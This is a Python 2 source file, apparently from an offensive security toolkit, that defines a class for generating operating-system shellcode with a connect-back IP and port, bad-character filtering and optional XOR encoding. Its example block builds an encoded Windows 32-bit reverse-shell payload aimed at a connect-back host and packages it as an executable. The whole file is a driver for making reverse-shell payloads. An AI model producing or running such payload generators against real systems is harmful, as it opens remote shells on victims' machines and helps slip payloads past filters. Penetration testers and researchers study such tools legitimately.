#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import time
import sys
from platform import system, architecture


#from pycparser import parse_file, c_parser, c_generator


from Asm import ShellGenerator, Constants
from Encoders import *
from ast import literal_eval

class OSShellcodes:
    """
        Class with shellcodes for operating systems (Linux, Windows, etc)
    """
    def __init__(self, OS_TARGET, OS_TARGET_ARCH, CONNECTBACK_IP='localhost', CONNECTBACK_PORT=5555, BADCHARS=['\x00']):
        self.name = ""
        self.OS_TARGET = OS_TARGET
        self.OS_TARGET_ARCH = OS_TARGET_ARCH
        self.CONNECTBACK_IP = CONNECTBACK_IP
        self.CONNECTBACK_PORT = CONNECTBACK_PORT
        self.BADCHARS = BADCHARS
        self.OS_SYSTEM = system().upper()
        self.OS_ARCH = (architecture())[0]
        return

    def create_shellcode(self, _shellcode_type='', command='calc.exe', message='', encode=None, make_exe=0, debug=0):
        """
            Function for create shellcode
        """
        generator = ShellGenerator(self.OS_TARGET, self.OS_TARGET_ARCH)
        shellcode = generator.get_shellcode(_shellcode_type,
                                            connectback_ip=self.CONNECTBACK_IP,
                                            connectback_port=self.CONNECTBACK_PORT,
                                            command=command,
                                            message=message,
                                            make_exe=make_exe,
                                            debug=debug)
        if encode:
            if debug == 1:
                print "[] Encode shellcode is on and started"
            e = CodeEncoders(self.OS_SYSTEM, self.OS_TARGET, self.OS_TARGET_ARCH, self.BADCHARS)
            e_shellcode = e.encode_shellcode(shellcode, encode, debug)

            if debug == 1:
                print "Length of encoded shellcode: %d" % len(e_shellcode)
                print "[] Encode shellcode finished"
            if e_shellcode:
                shellcode = e_shellcode
        else:
            if debug == 1:
                print "[] Encode shellcode is off"
        return shellcode

if __name__ == "__main__":
    # Example for generate shellcode for Linux/Windows
    print "[] Generate shellcode started"

    BADCHARS = ["\x00", "\x0a", "\x0d", "\x3b"]

    os_target = Constants.OS.WINDOWS
    os_target_arch = Constants.OS_ARCH.X32
    #s = OSShellcodes('172.16.195.128', 5555, BADCHARS)
    s = OSShellcodes(os_target, os_target_arch, '127.0.0.1', 4000, BADCHARS)

    shellcode_type = 'reverse'
    shellcode = s.create_shellcode(
        shellcode_type,
        encode=Constants.EncoderType.XOR,
        make_exe=1,
        debug=1
    )
    print "[] Generate shellcode finished"